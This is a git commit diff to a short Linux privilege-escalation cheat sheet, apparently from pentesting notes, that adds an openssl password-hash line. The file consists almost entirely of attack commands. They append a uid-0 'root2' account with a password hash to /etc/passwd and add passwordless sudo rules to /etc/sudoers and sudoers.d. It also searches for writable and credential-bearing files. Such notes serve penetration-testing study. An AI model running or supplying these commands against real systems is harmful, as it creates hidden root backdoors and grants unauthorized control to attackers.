5eadd3d8878463fb5931f6e7b6f2f7c4c887609a
German Sanmillan <sanmillan.german@gmail.com>
2023-07-07 15:06:21 +0200

    fix

--- PrivilegeEscalation/Linux/CommPrivEscVectors/WriteableSensibleFiles.sh
+++ PrivilegeEscalation/Linux/CommPrivEscVectors/WriteableSensibleFiles.sh
@@ -1,5 +1,8 @@
 find / -writable -type f 2>/dev/null #<---Display writeable files.
 echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd #<--- If /etc/passwd is writeable.
+
+openssl passwd -1 #<--- Create a password hash for /etc/passwd file.
+
 echo "<USERNAME>  ALL=(ALL) NOPASSWD:ALL" | tee -a /etc/sudoers #<--- If /etc/sudoers is writeable.
 echo "<USERNAME>  ALL=(ALL) NOPASSWD:ALL" | tee -a /etc/sudoers.d/<USERNAME> #<--- If /etc/sudoers.d directory is writeable.
 find <PATH> -name <Filename> 2>/dev/null #<--- Sensible files could contains credentials.
